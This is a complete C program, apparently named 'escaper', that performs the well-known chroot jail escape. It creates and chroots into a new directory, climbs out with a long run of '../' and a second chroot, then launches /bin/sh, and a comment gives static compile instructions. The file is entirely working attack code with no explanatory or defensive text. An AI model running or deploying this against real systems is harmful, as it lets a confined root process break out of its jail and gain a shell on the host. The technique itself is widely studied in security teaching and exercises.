#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>

// Compile statically
// gcc -o escaper escaper.c -static-libgcc -static

int main() {
    printf("escaping ...\n");
    mkdir("/pwn", 0700);
    int ret = chroot("/pwn");
    if (ret == -1){
        perror("could not chroot");
        return -1;
    }
    puts("first chroot done");
    ret = chdir("../../../../../../../../../../../../../../../../");
    if (ret == -1){
        perror("could not chdir");
        return -1;
    }
    ret = chroot(".");
    if (ret == -1){
        perror("could not chroot");
        return -1;
    }
    puts("second chroot done");
    char *exe[] = {"/bin/sh", NULL};
    execve(exe[0], exe, NULL);
}